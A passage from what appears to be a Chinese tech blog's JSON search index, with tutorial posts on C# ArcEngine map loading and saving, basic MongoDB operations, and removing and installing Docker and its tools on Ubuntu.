open.RestoreDirectory = true;\n            //打开窗口\n            open.ShowDialog();\n            // 存储打开的文件路径\n            string fileName = open.FileName;\n            if (mainMapControl.CheckMxFile(fileName))\n            {\n                //将数据载入pMapDocument并与Map控件关联\n                IMapDocument pMapDocument = new MapDocument();   // using ESRI.ArcGIS.Carto;\n                pMapDocument.Open(fileName, \"\");\n                //获取Map地图中激活的地图文档\n                mainMapControl.Map = pMapDocument.ActiveView.FocusMap;\n                mainMapControl.ActiveView.Refresh();\n            }\n\n```\n###### F4 使用ControlsOpenDocCommandClass类库资源 =》 适合比赛用\n```c#\n//using ESRI.ArcGIS.Controls;\n            ICommand command = new ControlsOpenDocCommandClass();    //using ESRI.ArcGIS.Controls;\n            command.OnCreate(mainMapControl.Object);\n            command.OnClick();\n            mainTOCControl.SetBuddyControl(mainMapControl);\n\n```\n\n##### 待改进之处： \n1. 窗口的大小以及出现的位置，美化\n2. Form的name随着文档的名字改变","tags":["GIS"],"categories":["GIS"]},{"title":"ArcEngine加载数据","url":"%2Fposts%2F980b1709%2F","content":"\n\n\n\n  \n### 加载shapefile数据\n\n###### F1 使用AddShapefile方法\n```\n private void 添加ShapefileToolStripMenuItem_Click(object sender, EventArgs e)\n        {\n\n            try\n            {\n                //同样实例化一个打开文件的类对象\n                OpenFileDialog open = new OpenFileDialog();\n                // 如果打开正确\n                if (open.ShowDialog() == DialogResult.OK)\n                {\n                    //首先定义一个空的路径\n                    string filePath = string.Empty;\n                    // 然后定义一个空的文件名\n                    string file = string.Empty;\n                    // 获取完整的文件路径\n                    string filedir = open.FileName;\n                    //如果路径为空，嘛都不返回\n                    if (fileDir == \"\") return;\n                    // 对完整路径进行截取  获取最后一个斜杠的索引\n                    int pos = filedir.LastIndexOf('\\\\');\n                    // 截取字符串  路径\n                    filePath =filedir.Substring(0, pos);\n                    //文件名\n                    file = filedir.Substring(pos+1);\n                    // 需要两个参数\n                    axMapControl1.AddShapeFile(filePath, file);\n                    //刷新\n                    axMapControl1.ActiveView.Refresh();\n                }\n            }\n            catch (Exception)\n            {\n                MessageBox.Show(\"请打开正确的文档!\", \"提醒\",MessageBoxButtons.OK, MessageBoxIcon.Error );\n            }\n        }\n\n```\n###### F2  使用工作空间\n思路:\n1. 创建ShapefileWorkspaceFactory实例，使用OpenFromFile方法打开工作区。\n2. 创建FeatureLayer的实例，定义数据集。\n3. 使用AddLayer方法加载数据。\n\n```\nusing ESRI.ArcGIS.Geodatabase;\nusing ESRI.ArcGIS.DataSourcesFile;\nusing ESRI.ArcGIS.DataSourcesRaster;\n```\n\n```\n            OpenFileDialog open = new OpenFileDialog();\n            open.CheckFileExists = true;\n            open.Title = \"打开Shape文件\";\n            open.RestoreDirectory = true;\n            open.Filter = \"Shape文件(*.shp)|**.shp\";\n            open.RestoreDirectory = true;\n            open.ShowDialog();\n\n            //获取完整的文件路径 :path+name\n            string fileDir = open.FileName;\n            //路径为空不返回\n            if (fileDir == \"\") return;\n            // 对完整路径进行截取  \n            int pos = fileDir.LastIndexOf(\"\\\\\");\n            //  路径\n            string pfilePath = fileDir.Substring(0, pos);\n            //文件名\n            string file = fileDir.Substring(pos + 1);\n\n            //实例化ShapefileWorkspaceFactory工作空间，打开Shape文件\n            IWorkspaceFactory pWsFactory = new ShapefileWorkspaceFactoryClass();\n            //强制转换   打开路径\n            IFeatureWorkspace pWorkSpace = pWsFactory.OpenFromFile(pfilePath, 0) as IFeatureWorkspace;\n            //创建并实例化要素类\n            IFeatureClass pFeatureClass = pWorkSpace.OpenFeatureClass(file);\n            IFeatureLayer pFeatureLayer = new FeatureLayerClass();\n            pFeatureLayer.Name = pFeatureClass.AliasName;\n            pFeatureLayer.FeatureClass = pFeatureClass;\n\n            mainMapControl.Map.AddLayer(pFeatureLayer);\n            mainMapControl.ActiveView.Refresh();\n            mainTOCControl.SetBuddyControl(mainMapControl);\n```\n\n### 加载栅格数据\n主要用到以下2个接口：\n1. IRasterPyramid3接口提供对栅格数据集的金字塔属性的访问\n-  Present属性--判断栅格数据集是否存在金字塔\n-  Create方法--为栅格数据集创建金字塔\n2. IRasterLayer接口继承自ILayer接口\n-  CreateFromDataset方法--从已有的栅格数据集对象创建图层\n-  CreateFromRaster方法--从已有的栅格对象创建图层\n-  Raster属性--获取IRasterLayer接口中的Raster对象\n-  DisplayResolutionFactor属性--设置栅格数据的分辨率\n\n```\n1.直接用IRasterLayer接口打开一个栅格文件并加载到地图控件\nIRasterLayer rasterLayer = new RasterLayerClass();\nrasterLayer.CreateFromFilePath(fileName); // fileName指存本地的栅格文件路径\naxMapControl1.AddLayer(rasterLayer, 0);\n\n```\n##### 2.思路:\n- (1)使用OpenFromFile方法获得栅格文件的工作区\n- (2)使用OpenRasterDataset方法获得栅格文件的数据集\n- (3)判断栅格数据集是否具有金字塔\n- (4)创建pRasterLayer，并定义数据集\n- (5)使用AddLayer方法加载数据\n```\n            OpenFileDialog pOpenFileDialog = new OpenFileDialog();\n            pOpenFileDialog.CheckFileExists = true;\n            pOpenFileDialog.Title = \"加载栅格数据\";\n            pOpenFileDialog.Filter = \"栅格文件(*.*)|*.bmp;*.tif;*.jpg;*.img;|BMP(*.bmp)|*.bmp;|TIF(*.tif)|*.tif;|JPG(*.jpg)|*.jpg;|IMG(*.img)|*.img\";\n            pOpenFileDialog.ShowDialog();\n            //获取名字\n            string pRasterFilename = pOpenFileDialog.FileName;\n            if (pRasterFilename == \"\") return;\n            // IO里面获取文件名字与路径的固定用法\n            string pPath = System.IO.Path.GetDirectoryName(pRasterFilename);\n            string pFileName = System.IO.Path.GetFileName(pRasterFilename);\n\n            IWorkspaceFactory pWorkspaceFactory = new RasterWorkspaceFactory();\n            IWorkspace pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0);\n            IRasterWorkspace pRasterWorkspace = pWorkspace as IRasterWorkspace;\n            IRasterDataset pRasterDataset = pRasterWorkspace.OpenRasterDataset(pFileName);\n            //影像金字塔的判断与创建\n            IRasterPyramid3 pRasPyramid;\n            pRasPyramid = pRasterDataset as IRasterPyramid3;\n            if (pRasPyramid != null)\n            {\n                if (!(pRasPyramid.Present))\n                { \n                    //创建金字塔\n                    pRasPyramid.Create();\n                }\n            }\n\n            IRaster pRaster;\n            pRaster = pRasterDataset.CreateDefaultRaster();\n            IRasterLayer pRasterLayer;\n            pRasterLayer = new RasterLayerClass();\n            pRasterLayer.CreateFromRaster(pRaster);\n            ILayer pLayer = pRasterLayer as ILayer;\n            mainMapControl.AddLayer(pLayer, 0);\n\n```\n\n### 加载CAD数据\n###### 1.作为矢量图层加载  === 1)分图层加载\n\n```\n            IWorkspaceFactory pWorkspaceFactory;\n            IFeatureWorkspace pFeatureWorkspace;\n            pWorkspaceFactory = new CadWorkspaceFactory();\n            pFeatureWorkspace = (IFeatureWorkspace)pWorkspaceFactory.OpenFromFile(pPath, 0);\n            //加载CAD文件中的线文件\n            IFeatureClass pFeatureClass = pFeatureWorkspace.OpenFeatureClass(pFileName + \":polyline\");\n            IFeatureLayer pFeatureLayer = new FeatureLayerClass();\n            pFeatureLayer.Name = pFileName;\n            pFeatureLayer.FeatureClass = pFeatureClass;\n            mainMapControl.Map.AddLayer(pFeatureLayer);\n            mainMapControl.ActiveView.Refresh();\n            mainTOCControl.SetBuddyControl(mainMapControl);\n\n```\n\n###### 2.作为矢量图层加载  === 1)整幅图加载\n```\n            //打开CAD数据集\n            IWorkspaceFactory pWorkspaceFactory = new CadWorkspaceFactoryClass();  //using ESRI.ArcGIS.DataSourcesFile;\n            IFeatureWorkspace pFeatureWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0) as IFeatureWorkspace;\n            //打开一个要素集\n            IFeatureDataset pFeatureDataset = pFeatureWorkspace.OpenFeatureDataset(pFileName);\n            // IFeatureContainer可以管理IFeatureDataset中的每个要素类\n            IFeatureClassContainer pFeatureContainer = (IFeatureClassContainer)pFeatureDataset;\n                \n            //对CAD文件中的要素进行遍历处理\n            for (int i = 0; i < pFeatureContainer.ClassCount; i++)\n            {\n                IFeatureClass pFeatureClass = pFeatureContainer.get_Class(i);\n                //如果是注记， 则添加注记层\n                if (pFeatureClass.FeatureType == esriFeatureType.esriFTCoverageAnnotation)\n                {\n                    IFeatureLayer pFeatureLayer = new FeatureLayerClass();\n                    pFeatureLayer.Name = pFeatureClass.AliasName;\n                    pFeatureLayer.FeatureClass = pFeatureClass;\n                    mainMapControl.Map.AddLayer(pFeatureLayer);       \n                }\n                else  //如果是点线面则添加要素层\n                {\n                    IFeatureLayer pFeatureLayer = new FeatureLayerClass();\n                    pFeatureLayer.Name = pFeatureClass.AliasName;\n                    pFeatureLayer.FeatureClass = pFeatureClass;\n                    mainMapControl.Map.AddLayer(pFeatureLayer);\n\n                 }\n                mainMapControl.ActiveView.Refresh();\n                mainTOCControl.SetBuddyControl(mainMapControl);\n            }\n\n```\n\n###### F3.作为栅格图层加载 \n```\n            IWorkspaceFactory pWorkspaceFactory;\n            IWorkspace pWorkspace;\n            ICadDrawingDataset pCadDrawingDataset;\n            ICadDrawingWorkspace pCadDrawingWorkspace;\n            ICadLayer pCadLayer;\n\n            pWorkspaceFactory = new CadWorkspaceFactoryClass();\n            pWorkspace = pWorkspaceFactory.OpenFromFile(pPath, 0);\n            pCadDrawingWorkspace = (ICadDrawingWorkspace)pWorkspace;\n            //获得CAD文件的数据集\n            pCadDrawingDataset = pCadDrawingWorkspace.OpenCadDrawingDataset(pFileName);\n            pCadLayer = new CadLayerClass();\n            pCadLayer.CadDrawingDataset = pCadDrawingDataset;\n            mainMapControl.Map.AddLayer(pCadLayer);\n            mainMapControl.ActiveView.Refresh();\n            mainTOCControl.SetBuddyControl(mainMapControl);\n\n```\n\n###### 加载个人地理数据库\n```\n\n\n```\n###### 加载文件地理数据库\n```\n\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["C#"],"categories":["GIS"]},{"title":"ArcEngine同步数据视图与布局视图","url":"%2Fposts%2F4c9b4c5b%2F","content":"\n  \n\n```C#\n// 数据视图与布局视图同步\nprivate void mainMapControl_OnAfterScreenDraw(object sender, IMapControlEvents2_OnAfterScreenDrawEvent e)\n{\n    IActiveView pActiveView = (IActiveView)mainPageLayoutControl1.ActiveView.FocusMap;\n    IDisplayTransformation displayTransformation = pActiveView.ScreenDisplay.DisplayTransformation;\n    displayTransformation.VisibleBounds = mainMapControl.Extent;\n    mainPageLayoutControl1.ActiveView.Refresh();\n    CopyToPageLayout();  // 调用下面的函数\n\n}\n\n```\n\n\n```c#\n// CopyToPageLayout() 布局视图与数据视图同步\nprivate void CopyToPageLayout()\n{\n    IObjectCopy pObjectCopy = new ObjectCopyClass();\n    object copyFromMap = mainMapControl.Map;\n    object copiedMap = pObjectCopy.Copy(copyFromMap);   // 复制地图到copiedMap中\n    object copyToMap = mainPageLayoutControl1.ActiveView.FocusMap;\n    pObjectCopy.Overwrite(copiedMap, ref copyToMap);   // 复制地图\n    mainPageLayoutControl1.ActiveView.Refresh();\n\n}\n```","tags":["GIS"],"categories":["GIS"]},{"title":"ArcEngine文件保存功能","url":"%2Fposts%2Fdb6b7e01%2F","content":"\n\n  \n### 地图文档保存\n  \n###### 问题：空文档也能保存\n```c#\nprivate void saveToolStrip_Click(object sender, EventArgs e)\n        {\n            try\n            {\n                string sMxdFileName = mainMapControl.DocumentFilename;\n                IMapDocument pMapDocument = new MapDocumentClass();\n                //检查文档是否为空以及有效性\n                if (sMxdFileName != null && mainMapControl.CheckMxFile(sMxdFileName))\n                {\n                    if (pMapDocument.get_IsReadOnly(sMxdFileName))\n                    {\n                        MessageBox.Show(\"地图本当为只读，不能保存！\");\n                        pMapDocument.Close();\n                        return;\n                    }\n                    \n                    else\n                    {\n                    SaveFileDialog pSaveFileDialog = new System.Windows.Forms.SaveFileDialog();\n                    pSaveFileDialog.Title = \"请选择保存路径\";\n                    pSaveFileDialog.Filter = \"ArcMap文档(*.mxd)|*.mxd|ArcMap模板(*.mxt)|*.mxt\";\n                    //当相同的文件存在是提示错误\n                    pSaveFileDialog.OverwritePrompt = true;\n                    pSaveFileDialog.RestoreDirectory = true;\n                    if (pSaveFileDialog.ShowDialog() == DialogResult.OK)\n                    {\n                        //获取名字\n                        sMxdFileName = pSaveFileDialog.FileName;\n                    }\n                    else\n                    {\n                        return;\n                    }\n                        pMapDocument.New(sMxdFileName);\n                        pMapDocument.ReplaceContents(mainMapControl.Map as IMxdContents);\n                        //保存为绝对路径\n                        pMapDocument.Save(pMapDocument.UsesRelativePaths, true);\n                        pMapDocument.Close();\n                        MessageBox.Show(\"保存文档成功\");\n                }\n                }\n               \n                \n            }\n            catch (Exception ex)\n            {\n                MessageBox.Show(ex.Message);\n            }\n        }\n\n```\n### 地图文档另存为1\n```c#\nprivate void saveAsToolStrip_Click(object sender, EventArgs e)\n        {\n            try\n            {\n                SaveFileDialog pSaveDialog = new System.Windows.Forms.SaveFileDialog();\n                pSaveDialog.Title = \"另存为\";\n                pSaveDialog.OverwritePrompt = true;//当相同的文件存在是提示错误\n                pSaveDialog.Filter = \"ArcMap文档(*.mxd)|*.mxd|ArcMap模板(*.mxt)|*.mxt\";\n                pSaveDialog.RestoreDirectory = true;\n                if (pSaveDialog.ShowDialog() == DialogResult.OK)\n                {\n                    string sFilePath = pSaveDialog.FileName;\n                    IMapDocument pMapDocument = new MapDocumentClass();\n                    pMapDocument.New(sFilePath);\n                    pMapDocument.ReplaceContents(mainMapControl.Map as IMxdContents);\n                    pMapDocument.Save(true, true);\n                    pMapDocument.Close();\n                }\n            }\n            catch (Exception ex)\n            {\n                MessageBox.Show(ex.Message);\n            }\n        }\n```\n\n### 地图另存为2\n```c#\n                ICommand command = new ControlsSaveAsDocCommandClass();\n                command.OnCreate(mainMapControl.Object);\n                command.OnClick();\n```","tags":["GIS"],"categories":["GIS"]},{"title":"MongoDB初试及基本操作","url":"%2Fposts%2F28f19af%2F","content":"\n\n  \n#### 分布式：\n\n一个任务分成多个子任务完成  （副手）\n\n#### 集群：\n\n一个任务由多态服务器同时服务\n\n\n\n**大数据**\n\n文档结构，海量数据，大容量存储，高校存储大量二进制文件\n\n\n\n**场景：**\n\n1.需要不断扩容；\n\n2.新应用，需求会变，数据模型无法确定；\n\n3.高可用（不宕机）\n\n4.需要整合多个外部数据源\n\n\n\n|  **SQL术语**  | **MongoDB术语** |        **解释说明**         |\n| :---------: | :-----------: | :---------------------: |\n|  database   |   database    |           数据库           |\n|    table    |  collection   |         数据库表/集合         |\n|     row     |   document    |        数据记录行/文档         |\n|   column    |     field     |          字段/域           |\n|    index    |     index     |           索引            |\n| table joins |               |     表连接，MongoDB不支持      |\n| primary key |  primary key  | 主键，MongoDB自动将_id字段设置为主键 |\n\n文档：就是一个对象，由键值对构成，是json的一种扩展 Bson形式\n\n字段(域)之间可以是不同类型:\n\n``{‘book’:'xxx', 'hero':'yyy'}`\n\n`{'name':'sjz', 'age':18}`\n\n\n\n**下载完成后，将可执行文件添加到PATH路径中**\n\nexport PATH=/user/local/mondodb/bin:$PATH\n\n**服务端mongod**\n\n配置文件位置  etc/mongod.conf\n\n默认端口  27017\n\n**查看端口：**\n\n```\nss -tnl\n```\n\n**数据库服务启动/停止/重启**\n\n```\nsudo service mongodb start/stop/restart\n```\n\n**查看状态：**\n\n```\nsudo service mongodb status\n```\n\n**客户端启动**\n\n```\nmongo\n```\n\n**连接mongodb:**\t\n\n```\n# 进入\nmongo\t\n# 退出\nexit 或者 ctrl + c 或 quit()\n```\n\n\n\n## 数据库级操作：\n\n**1.查看所有数据库**\n\n```\nshow dbs\n```\n\n**2.创建数据库**\n\n```\nuse mydb\n\n# 创建之后，如果不插入数据的话， show dbs是看不到刚建立的数据库的\n```\n\n3.显示当前数据库\n\n```\ndb\n```\n\n**4.删除数据库**\n\n```\ndb.dropDatabase()  # 注意大小写\n```\n\n\n\n\n\n","tags":["数据库"],"categories":["数据库"]},{"title":"ArcEngine\"万能\"\"加载数据方法","url":"%2Fposts%2Feb2e44a3%2F","content":"\n\n  \n**下面介绍一种“万能”加载数据的办法：** \n\n```c#\n// 加载很多种数据\nICommand command = new ControlsAddDataCommandClass();\ncommand.OnCreate(mainMapControl.Object);\ncommand.OnClick();\nmainMapControl.ActiveView.Refresh();\n```\n\n","tags":["GIS"],"categories":["GIS"]},{"title":"docker删除镜像和容器","url":"%2Fposts%2F329caef9%2F","content":"\n\n  \n先查看容器运行状态\n\n```\ndocker ps -a\n```\n\n找到image对应的容器，先stop\n```\n# id\ndocker stop d751d48a6d0a\n\n```\n\n再删除容器\n```\ndocker rm d751d48a6d0a\n```\n\n最后才能删除镜像\n```\n docker rmi fce289e99eb9\n \n \n # 查看镜像，删除ok\n docker images\n```\n\n\n\n- 注：rm与rmi的区别\n```\nrm Remove one or more containers\nrmi Remove one or more images\n```","tags":["docker"],"categories":["docker"]},{"title":"docker安装","url":"%2Fposts%2F327177db%2F","content":"\n\n  \ndocker：有两个版本:docker-ce(社区版)和docker-ee(企业版)。\n\n        笔者这里介绍安装或升级的是最新版docker-ce(社区版)。\n    \n        参考官网地址：https://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/#os-requirements\n\ndocker-compse：可运行和管理多个docker容器。\n\ndocker-machine：docker官方提供的docker管理工具。可管理多个docker主机，可搭建swarm集群。\n\n一、docker安装\n1，卸载旧版本docker\n\n全新安装时，无需执行该步骤\n\n\n```\n$ sudo apt-get remove docker docker-engine docker.io\n```\n\n2，更新系统软件\n\n\n```\n$ sudo apt-get update\n```\n\n3，安装依赖包\n\n\n```\n$ sudo apt-get install \\\n    apt-transport-https \\\n    ca-certificates \\\n    curl \\\n    software-properties-common\n```\n\n4，添加官方密钥\n\n执行该命令时，如遇到长时间没有响应说明网络连接不到docker网站，需要使用代-理进行。\n\n\n```\n$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -\n```\n\n显示OK,表示添加成功.\n\n5，添加仓库\n\n\n```\n$ sudo add-apt-repository \\\n   \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\\n   $(lsb_release -cs) \\\n   stable\"\n```\n\n6，再次更新软件\n\n经实践，这一步不能够省略，我们需要再次把软件更新到最新，否则下一步有可能会报错。\n\n\n```\n$ sudo apt-get update\n```\n\n7，安装docker\n\n如果想指定安装某一版本，可使用 sudo apt-get install docker-ce=<VERSION>  命令，把<VERSION>替换为具体版本即可。\n\n以下命令没有指定版本，默认就会安装最新版\n\n\n```\n$ sudo apt-get install docker-ce\n```\n\n8，查看docker版本\n\n\n```\n$ docker -v\n```\n\n显示“Docker version 17.09.0-ce, build afdb6d4”字样，表示安装成功。\n\n二、docker-compose安装\n1，下载docker-compose\n\n\n```\n$ sudo curl -L https://github.com/docker/compose/releases/download/1.17.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose\n```\n\n2，授权\n\n\n```\n$ sudo chmod +x /usr/local/bin/docker-compose\n```\n\n3，查看版本信息\n\n\n```\n$ docker-compose --version\n```\n\n显示出版本信息，即安装成功。\n\n三、docker-machine安装\n说明：docker-machine的使用是要基于virtualBox的。如果没有安装安装过，请先安装virtualBox。\n\n1，安装virtualBox\n\n登录virtualBox官网：https://www.virtualbox.org/wiki/Linux_Downloads\n\n找到\"Ubuntu 16.04 (\"Xenial\")  i386 |  AMD64\"字样，点击“AMD64”进行下载。\n\n下载后，执行以下命令进行安装：\n\n\n```\n$ sudo dpkg -i virtualbox-5.2_5.2.0-118431_Ubuntu_xenial_amd64.deb\n```\n\n2，下载并安装docker-machine\n\n\n```\n$ curl -L https://github.com/docker/machine/releases/download/v0.13.0/docker-machine-`uname -s`-`uname -m` >/tmp/docker-machine &&\nchmod +x /tmp/docker-machine &&\nsudo cp /tmp/docker-machine /usr/local/bin/docker-machine\n```\n\n3，查看版本信息\n\n\n```\n$ docker-machine version\n```\n\n显示出版本信息，即安装成功。","tags":["docker"],"categories":["docker"]}]